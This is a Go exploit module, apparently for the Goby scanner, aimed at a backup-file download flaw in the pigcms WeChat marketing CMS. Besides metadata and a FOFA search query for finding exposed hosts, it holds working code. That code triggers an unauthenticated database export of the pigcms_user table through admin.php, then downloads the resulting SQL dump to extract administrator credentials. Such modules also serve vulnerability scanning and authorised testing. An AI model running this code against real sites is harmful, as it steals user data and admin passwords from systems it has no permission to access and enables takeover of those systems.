package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "pigcms action_export File Download",
    "Description": "<p>pigcms is a management system designed to provide customers with WeChat marketing.</p><p>The action_export function of pigcms system has a backup file download vulnerability. Attackers can download the backup file and obtain the administrator password to take over the system further.</p>",
    "Impact": "pigcms action_export File Download",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "pigcms",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "小猪 cms 系统 action_export 存在文件下载漏洞",
            "Description": "<p>小猪cms是一款专为客户提供微信营销的管理系统。</p><p>小猪cms系统action_export函数存在备份文件下载漏洞，攻击者可下载备份文件获取管理员密码进一步接管系统。</p>",
            "Impact": "<p>小猪cms系统action_export函数存在备份文件下载漏洞，攻击者可下载备份文件获取管理员密码进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "小猪cms",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "pigcms action_export File Download",
            "Description": "<p>pigcms is a management system designed to provide customers with WeChat marketing.</p><p>The action_export function of pigcms system has a backup file download vulnerability. Attackers can download the backup file and obtain the administrator password to take over the system further.</p>",
            "Impact": "pigcms action_export File Download",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "pigcms",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "header=\"PigCms.com\" || banner=\"PigCms.com\"",
    "GobyQuery": "header=\"PigCms.com\" || banner=\"PigCms.com\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.pigcms.com/",
    "DisclosureDate": "2021-11-15",
    "References": [
        "https://xz.aliyun.com/t/10470"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "pigcms"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10237"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cms/manage/admin.php?m=manage&c=database&a=action_export"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `tables[]=pigcms_user&sizelimit=10&fileId1&random=&tableId=startfrom=`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if strings.Contains(resp1.RawBody, ".sql") {
					sqlName := regexp.MustCompile("((\\d|_)*?)\\.sql").FindStringSubmatch(resp1.RawBody)
					uri2 := fmt.Sprintf("/cms/backup/data%d-%d-%d/%s.sql", time.Now().Year(), time.Now().Month(), time.Now().Day(), sqlName[1])
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "pigcms_user")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/cms/manage/admin.php?m=manage&c=database&a=action_export"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `tables[]=pigcms_user&sizelimit=10&fileId1&random=&tableId=startfrom=`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if strings.Contains(resp1.RawBody, ".sql") {
					sqlName := regexp.MustCompile("((\\d|_)*?)\\.sql").FindStringSubmatch(resp1.RawBody)
					uri2 := fmt.Sprintf("/cms/backup/data%d-%d-%d/%s.sql", time.Now().Year(), time.Now().Month(), time.Now().Day(), sqlName[1])
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
